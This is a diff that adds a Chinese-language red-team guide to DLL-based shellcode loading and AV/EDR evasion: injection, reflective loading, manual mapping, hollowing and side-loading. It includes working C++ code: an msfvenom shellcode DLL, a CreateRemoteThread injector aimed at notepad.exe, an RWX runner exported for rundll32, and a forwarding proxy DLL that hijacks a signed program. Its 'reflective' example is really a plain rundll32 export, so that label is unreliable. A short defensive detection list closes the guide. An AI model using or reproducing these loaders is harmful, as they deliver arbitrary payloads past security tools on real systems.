@@ -1,0 +1,357 @@
+## 1. 概述 (Overview)
+
+在现代红队行动与 APT 攻击中，如何将恶意代码（通常为 ShellCode）植入目标系统并稳定执行，是整个攻击链路中至关重要的一环。传统的直接执行 EXE 或加载普通 DLL 的方式极易被 EDR（端点检测与响应）和 AV（反病毒软件）通过静态特征、行为分析和内存扫描等方式捕获。
+
+本文档旨在深入探讨几种主流的、用于绕过安全监控的 DLL 操作与 ShellCode 加载技术。我们将从基础的 DLL 注入讲起，逐步深入到反射注入、手动映射、DLL 镂空和侧加载（白加黑）等更高级的免杀策略。本文的目标是结合理论与实践，为安全研究人员和红队工程师提供一份清晰、可操作的技术指南。
+
+这些技术的核心思想在于：
+
+-   **隐藏恶意载荷**：将 ShellCode 隐藏在看似无害的 DLL 文件或内存区域中。
+-   **滥用系统信任**：利用操作系统或受信任的应用程序（白名单程序）来加载和执行我们的恶意代码。
+-   **规避检测机制**：绕过 `LoadLibrary` 等敏感 API 的钩子，或在内存中模拟合法的模块加载，从而欺骗安全软件的检测。
+
+---
+
+## 2. 技术原理 (Technical Principles)
+
+### 2.1 DLL 注入 (DLL Injection)
+
+最基础的跨进程代码植入技术。攻击者编写一个加载器程序（Injector EXE），通过 `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` 等一系列 Windows API，强制目标进程加载一个指定的 DLL 文件。
+
+-   **流程**：
+    1.  加载器（EXE）获取目标进程的句柄。
+    2.  在目标进程的虚拟地址空间中申请一块内存。
+    3.  将要注入的 DLL 文件路径写入这块内存。
+    4.  获取 `LoadLibraryA` 或 `LoadLibraryW` 函数的地址（它在所有进程中的地址通常是相同的）。
+    5.  通过 `CreateRemoteThread` 在目标进程中创建一个新线程，该线程的起始地址为 `LoadLibrary`，参数为刚刚写入的 DLL 路径。
+    6.  目标进程的新线程执行 `LoadLibrary`，加载恶意 DLL，并执行其 `DllMain` 函数中的代码。
+
+### 2.2 反射 DLL 注入 (Reflective DLL Injection)
+
+为了解决传统 DLL 注入需要将 DLL 文件落地（写入磁盘）的问题，反射注入应运而生。它将整个 DLL 文件作为原始字节流读入内存，然后通过一个特殊的导出函数（反射加载器）在目标进程内存中手动解析和加载自身，完全不依赖于系统的 `LoadLibrary` API。
+
+-   **流程**：
+    1.  攻击者将恶意 DLL 文件完整读入加载器（Injector）的内存中。
+    2.  在目标进程中申请一块足够大的内存，并将整个 DLL 文件字节流写入。
+    3.  在目标进程中再申请一小块内存，用于存放一小段引导代码（Bootstrap ShellCode）。
+    4.  这段引导代码负责调用 DLL 内部一个特殊的导出函数（例如 `ReflectiveLoader`）。
+    5.  `ReflectiveLoader` 函数会像操作系统加载器一样，手动解析 PE 头、处理重定位、修复导入表（IAT），最后跳转到 DLL 的入口点 `DllMain` 执行。
+
+### 2.3 手动映射注入 (Manual Mapping Injection)
+
+手动映射是反射注入的进一步演进，它将反射加载的逻辑完全放在了加载器（Injector）一侧，而不是 DLL 自身。加载器负责在远程进程中完成 DLL 的所有加载步骤，从而使得 DLL 本身可以非常“干净”，无需包含任何反射加载代码。
+
+-   **流程**：
+    1.  加载器读取 DLL 文件内容到本地内存。
+    2.  在目标进程中通过 `VirtualAllocEx` 申请一块与 DLL 内存镜像大小（`SizeOfImage`）相同的内存。
+    3.  手动解析 DLL 的 PE 头，将其各个节（Section）逐一通过 `WriteProcessMemory` 写入目标进程申请的内存中。
+    4.  处理内存重定位（Relocations），修正因基址变化而失效的绝对地址。
+    5.  修复导入地址表（IAT），通过 `GetProcAddress` 在本地获取函数地址，然后写入目标进程的 IAT 中。
+    6.  最后，通过 `CreateRemoteThread` 在目标进程中创建一个线程，直接从 DLL 的入口点（`AddressOfEntryPoint`）开始执行。
+
+### 2.4 DLL 镂空 (DLL Hollowing)
+
+DLL 镂空是一种巧妙的内存伪装技术。它利用了操作系统加载器已经将一个合法、受信任的 DLL（通常是系统自带的）加载到内存中的事实。攻击者随后在内存中找到这个合法的 DLL，将其代码节（`.text`）等关键部分“镂空”，然后用恶意的 ShellCode 填充进去。
+
+-   **流程**：
+    1.  加载器程序首先通过 `LoadLibrary` 加载一个合法的、白名单 DLL（例如 `amsi.dll`）。
+    2.  在内存中定位这个 DLL 的基地址。
+    3.  修改该 DLL 所在内存页的保护属性为可读、可写、可执行（`PAGE_EXECUTE_READWRITE`）。
+    4.  将恶意的 ShellCode 覆盖写入 DLL 的代码区域（例如 `.text` 节的起始位置）。
+    5.  通过 `CreateThread` 或其他方式，创建一个指向被覆盖区域的线程来执行 ShellCode。
+    6.  由于内存扫描时，这块内存区域仍然被标记为属于一个合法的、有数字签名的 DLL 模块，因此有很大概率能欺骗 EDR 的检测。
+
+### 2.5 DLL 侧加载 (DLL Side-Loading)
+
+也称为“白加黑”，是目前最流行和有效的持久化与执行技术之一。它利用了 Windows 应用程序加载 DLL 的默认搜索顺序。如果一个受信任的、有签名的程序（白程序）尝试加载一个 DLL，但没有指定绝对路径，那么系统会按照特定顺序（程序目录、System32 等）查找。攻击者可以将一个恶意的 DLL（黑 DLL）伪装成白程序需要加载的那个 DLL，并放置在程序目录下，从而实现“劫持”。
+
+-   **流程**：
+    1.  **挖掘**：找到一个有数字签名且功能正常的白程序（例如 `Teams.exe`, `DingTalk.exe` 等）。
+    2.  **分析**：使用 `Process Monitor` 等工具分析该白程序启动时会尝试加载哪些 DLL。重点关注那些在程序自身目录下不存在，但会去系统目录加载的 DLL。
+    3.  **伪造**：选择一个目标 DLL（例如 `libcef.dll`），编写一个同名的恶意 DLL。这个恶意 DLL 必须导出所有原始 DLL 的导出函数，以确保白程序的正常功能不受影响。这通常通过“DLL 代理”技术实现，即恶意 DLL 接收到函数调用后，再转发给真正的原始 DLL。
+    4.  **植入**：在恶意 DLL 的 `DllMain` 函数或某个被频繁调用的导出函数中，植入我们的 ShellCode 加载逻辑。
+    5.  **部署**：将白程序、伪造的黑 DLL 以及（可选的）重命名的原始 DLL 放在同一个目录下。当用户或系统运行这个白程序时，它会优先加载目录下的黑 DLL，从而触发恶意代码。
+
+---
+
+## 3. 环境准备 (Environment Setup)
+
+-   **操作系统**: Windows 10/11 x64
+-   **开发环境**: Visual Studio 2019/2022 (with C++ Desktop Development workload)
+-   **分析工具**:
+    -   `Process Monitor (ProcMon)`: 用于分析进程加载 DLL 的行为。
+    -   `x64dbg` / `Windbg`: 用于动态调试和分析内存。
+    -   `PE-bear` / `010 Editor`: 用于查看和分析 PE 文件结构。
+-   **ShellCode 生成**: Cobalt Strike, Metasploit Framework, or custom shellcode.
+
+---
+
+## 4. 实战示例 (Practical Examples)
+
+### 示例 1: 基础 DLL 注入 (自定义 EXE + 自定义 DLL)
+
+这是一个最经典的组合，用于演示基本原理。
+
+**DLL (MyDll.dll) 代码:**
+`DllMain` 是 DLL 的入口点。当 DLL 被加载时，此函数会被调用。我们将 ShellCode 加载逻辑放在这里。
+
+```cpp
+#include <windows.h>
+
+// 使用 msfvenom 生成的 x64 calc.exe shellcode
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char shellcode[] =
+    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
+    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+
+    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+    "\x63\x2e\x65\x78\x65\x00";
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        {
+            // 在新线程中执行 ShellCode，避免阻塞 DllMain
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
+        }
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+**加载器 (Injector.exe) 代码:**
+这个程序负责找到一个进程（例如 `notepad.exe`），然后将 `MyDll.dll` 注入进去。
+
+```cpp
+#include <iostream>
+#include <windows.h>
+#include <tlhelp32.h>
+
+// 通过进程名获取PID
+DWORD GetProcessIdByName(const wchar_t* processName) {
+    PROCESSENTRY32W entry;
+    entry.dwSize = sizeof(PROCESSENTRY32W);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (Process32FirstW(snapshot, &entry)) {
+        while (Process32NextW(snapshot, &entry)) {
+            if (_wcsicmp(entry.szExeFile, processName) == 0) {
+                CloseHandle(snapshot);
+                return entry.th32ProcessID;
+            }
+        }
+    }
+    CloseHandle(snapshot);
+    return 0;
+}
+
+int main() {
+    const char* dllPath = "C:\\path\\to\\your\\MyDll.dll"; // 使用绝对路径
+    const wchar_t* targetProcessName = L"notepad.exe";
+
+    DWORD pid = GetProcessIdByName(targetProcessName);
+    if (pid == 0) {
+        std::cerr << "Process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        std::cerr << "Failed to open process." << std::endl;
+        return 1;
+    }
+
+    // 在目标进程中分配内存
+    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (pRemoteMem == NULL) {
+        std::cerr << "VirtualAllocEx failed." << std::endl;
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    // 将DLL路径写入目标进程内存
+    WriteProcessMemory(hProcess, pRemoteMem, dllPath, strlen(dllPath) + 1, NULL);
+
+    // 获取 LoadLibraryA 地址
+    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // 创建远程线程执行 LoadLibraryA
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMem, 0, NULL);
+    if (hThread == NULL) {
+        std::cerr << "CreateRemoteThread failed." << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    std::cout << "Injection successful." << std::endl;
+    
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return 0;
+}
+```
+
+-   **攻击流程**:
+    1.  编译 `MyDll.dll` 和 `Injector.exe`。
+    2.  打开一个记事本程序 (`notepad.exe`)。
+    3.  将 `MyDll.dll` 放置在一个已知路径下。
+    4.  运行 `Injector.exe`。
+    5.  `notepad.exe` 进程会加载 `MyDll.dll`，并执行其中的 ShellCode，弹出计算器。
+
+-   **风险**: `Injector.exe` 的行为（`OpenProcess`, `WriteProcessMemory` 等）非常敏感，容易被监控。`MyDll.dll` 文件落地，会面临静态查杀。
+
+### 示例 2: 反射 DLL 注入 (通过系统程序加载)
+
+这种方法避免了编写自定义的 `Injector.exe`，而是利用系统自带的 `rundll32.exe` 来加载我们的 DLL。但这要求 DLL 必须导出一个特定格式的函数。
+
+**DLL (ReflectiveDll.dll) 代码:**
+这个 DLL 除了包含 ShellCode，还需要一个特殊的导出函数，例如 `ExecuteC2Shellcode`。
+
+```cpp
+#include <windows.h>
+
+// ShellCode (同上)
+unsigned char shellcode[] = " ... ";
+
+// 导出函数，必须符合 rundll32 的调用约定
+// extern "C" 是为了防止 C++ 的名字修饰 (name mangling)
+extern "C" __declspec(dllexport) void ExecuteC2Shellcode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    // 分配可执行内存
+    LPVOID pShellcode = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pShellcode) {
+        // 复制 ShellCode
+        memcpy(pShellcode, shellcode, sizeof(shellcode));
+        // 执行
+        ((void(*)())pShellcode)();
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    // DllMain 在这里可以保持干净，逻辑移到导出函数中
+    return TRUE;
+}
+```
+
+-   **攻击流程**:
+    1.  编译 `ReflectiveDll.dll`。
+    2.  将 `ReflectiveDll.dll` 放置到目标机器上。
+    3.  在命令行中执行以下命令：
+        ```bash
+        rundll32.exe ReflectiveDll.dll,ExecuteC2Shellcode
+        ```
+    4.  `rundll32.exe` 会加载 `ReflectiveDll.dll` 并调用其导出的 `ExecuteC2Shellcode` 函数，从而执行 ShellCode。
+
+-   **风险**: DLL 文件仍然需要落地，面临静态查杀。`rundll32.exe` 加载未签名或不常见的 DLL 也是一个可疑行为。
+
+### 示例 3: DLL 侧加载 (白加黑)
+
+这是目前最实用和隐蔽的技巧之一。我们以一个假设的白程序 `LiveStream.exe` 为例，它在启动时会加载 `libcef.dll`。
+
+**攻击流程**:
+1.  **分析**: 使用 `ProcMon` 监控 `LiveStream.exe` 的启动过程，过滤 `Operation` 为 `CreateFile`，并观察 `Path` 中包含 `.dll` 的条目。发现它会尝试从程序目录加载 `libcef.dll`，如果失败，则从系统路径加载。
+2.  **创建代理 DLL**:
+    -   找到系统中的原始 `libcef.dll`。
+    -   使用工具（如 `AheadLib`）或脚本分析其所有导出函数。
+    -   创建一个新的 C++ DLL 项目，命名为 `libcef.dll`。
+    -   在新 DLL 中，实现所有原始导出函数，并将调用转发给原始 DLL。原始 DLL 可以被重命名为 `libcef_orig.dll` 并放在同一目录下。
+
+**伪造的 libcef.dll 代码:**
+
+```cpp
+#include <windows.h>
+
+// 定义一个函数指针，用于执行 ShellCode
+typedef void (*FUN_SHELLCODE)();
+
+// ShellCode (同上)
+unsigned char shellcode[] = " ... ";
+
+// 加载原始 DLL 并获取函数地址的pragma
+#pragma comment(linker, "/export:SomeExportedFunction=libcef_orig.SomeExportedFunction,@1")
+#pragma comment(linker, "/export:AnotherExportedFunction=libcef_orig.AnotherExportedFunction,@2")
+// ... 为所有导出函数添加 pragma ...
+
+void ExecutePayload() {
+    LPVOID pShellcode = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pShellcode) {
+        memcpy(pShellcode, shellcode, sizeof(shellcode));
+        FUN_SHELLCODE run = (FUN_SHELLCODE)pShellcode;
+        run();
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        // 当 DLL 被加载时，在新线程中执行我们的恶意代码
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecutePayload, NULL, 0, NULL);
+        break;
+    // ...
+    }
+    return TRUE;
+}
+```
+
+3.  **部署**:
+    -   将 `LiveStream.exe`（白程序）放在一个新目录中。
+    -   将我们编译生成的 `libcef.dll`（黑 DLL）放在同一目录。
+    -   将原始的 `libcef.dll` 重命名为 `libcef_orig.dll`，也放在该目录。
+4.  **执行**:
+    -   运行 `LiveStream.exe`。
+    -   程序启动，自动加载同目录下的 `libcef.dll`（我们的黑 DLL）。
+    -   黑 DLL 的 `DllMain` 被触发，执行 ShellCode。
+    -   同时，由于所有函数调用都被转发到了 `libcef_orig.dll`，`LiveStream.exe` 的正常功能完全不受影响，极具迷惑性。
+
+-   **风险**: 这种方法的主要风险在于寻找合适的白程序和可劫持的 DLL。如果伪造的 DLL 导出函数不完整，可能导致白程序崩溃而暴露。
+
+---
+
+## 5. 关键细节 (Key Details)
+
+-   **`DllMain` 的限制**: `DllMain` 函数在执行时持有加载器锁（Loader Lock），在此函数内执行复杂操作（如加载其他 DLL、创建复杂线程、网络通信）可能导致死锁。因此，最佳实践是在 `DllMain` 中仅创建一个新线程，然后立即返回 `TRUE`，将所有耗时或危险的操作都放在新线程中执行。
+-   **内存保护属性**: 使用 `VirtualAlloc` 或 `VirtualProtect` 分配或修改内存时，需要赋予 `PAGE_EXECUTE_READWRITE` 权限。然而，一块同时可写又可执行的内存页是 EDR 内存扫描的重点监控对象。更高级的做法是：先以 `PAGE_READWRITE` 写入 ShellCode，然后通过 `VirtualProtect` 将其修改为 `PAGE_EXECUTE_READ`，最后再执行。
+-   **API 钩子**: `LoadLibrary`, `CreateRemoteThread` 等是安全软件重点监控的 API。手动映射注入的核心优势就是完全绕过了 `LoadLibrary`，从而规避了对其的钩子检测。
+-   **寻找白加黑目标**: 使用 `ProcMon` 是标准做法。设置过滤器，只监控目标白程序的 `CreateFile` 和 `Load Image` 操作，并筛选出结果为 `NAME NOT FOUND` 的 DLL 加载尝试。这些 DLL 就是潜在的劫持目标。
+
+---
+
+## 6. 安全总结 (Security Summary)
+
+本文介绍的 DLL 相关技术是 C2 免杀领域的核心组成部分。从攻击者的角度来看，演进路线清晰地体现了“减少落地文件”和“滥用系统信任”两大趋势。
+
+-   **DLL 注入** 是基础，但因特征明显，在现代攻防中已较少直接使用。
+-   **反射注入** 和 **手动映射** 通过无文件落地的方式，显著提升了隐蔽性，是目前主流的内存攻击手段。
+-   **DLL 镂空** 和 **DLL 侧加载** 则将伪装发挥到了极致。它们将恶意代码与合法、有签名的模块或程序绑定在一起，使得基于签名的静态检测和基于信任链的行为分析变得异常困难。
+
+对于防御方而言，这意味着必须具备更深层次的检测能力：
+
+1.  **内存扫描**: 定期扫描进程内存，寻找没有合法模块（PEB 中无记录）支持的可执行内存区域，或检测内存页权限异常（如 `RWX`）。
+2.  **API 监控**: 不仅要监控 `LoadLibrary`，更要监控 `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `NtMapViewOfSection` 等更底层的 API 调用链，并基于调用栈和参数进行关联分析。
+3.  **模块完整性校验**: 对于加载到内存中的系统 DLL，可以对其 `.text` 节等关键部分计算哈希值，并与磁盘上原始文件的哈希值进行比对，以发现 DLL 镂空等篡改行为。
+4.  **加载路径异常检测**: 监控 `rundll32.exe` 或其他系统进程加载非系统目录下的 DLL 的行为。监控知名白程序从其程序目录加载了通常位于系统目录的 DLL。
+
+最终，攻防的本质是持续的对抗和升级。理解这些攻击技术的工作原理，是构建有效防御策略的基石。
